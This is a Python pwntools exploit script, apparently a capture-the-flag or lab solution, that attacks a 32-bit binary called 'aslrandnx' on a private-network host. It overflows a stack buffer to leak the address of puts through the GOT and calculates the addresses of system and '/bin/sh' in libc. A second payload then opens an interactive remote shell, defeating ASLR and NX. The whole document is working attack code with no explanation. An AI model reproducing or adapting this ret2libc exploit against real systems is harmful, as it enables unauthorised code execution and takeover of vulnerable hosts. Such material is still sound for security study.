# -*- coding: utf-8 -*-

from pwn import *

pwnable_filename = "./aslrandnx"
# libc_filename = "/lib/i386-linux-gnu/libc.so.6"
libc_filename = "./libc.so.6"

Io = remote("192.168.210.11", 10005)
# Io = process(pwnable_filename)

# gdb.attach(proc.pidof(Io)[0], gdbscript='b system\nc')

pwnable = ELF(pwnable_filename)
libc = ELF(libc_filename)


puts_plt = pwnable.plt['puts']
main_addr = 0x080484E7

puts_got = pwnable.got['puts']

libc_puts_offset = libc.symbols['puts']
libc_system_offset = libc.symbols['system']
libc_bin_sh_offset = next(libc.search("/bin/sh\x00"))

junk_size = 0x2C
junk = "A" * junk_size


def leak(address):
    # Clear buffer
    Io.read()
    # Leak puts got
    payload = flat([
        junk,
        p32(puts_plt),
        p32(main_addr),
        p32(address),
    ])
    print "[+] Payload: %r" % (payload)
    Io.sendline(payload)
    puts_addr = u32(Io.read(4))
    return puts_addr


puts_addr = leak(puts_got)
print "[+] puts_addr: 0x%08x" % (puts_addr)

# puts_offset - system_offset = remote_puts_addr - remote_system_addr
# remote_system_addr = remote_puts_addr - puts_offset + system_offset
system_addr = puts_addr - libc_puts_offset + libc_system_offset
print "[+] system_addr: 0x%08x" % (system_addr)

bin_sh_addr = puts_addr - libc_puts_offset + libc_bin_sh_offset
print "[+] bin_sh_addr: 0x%08x" % (bin_sh_addr)

# Clear buffer
# Io.read()

# Leak puts got
payload = flat([
    junk,
    p32(system_addr),
    p32(0xFFFFFFFF),
    p32(bin_sh_addr),
])
Io.sendline(payload)

Io.interactive()
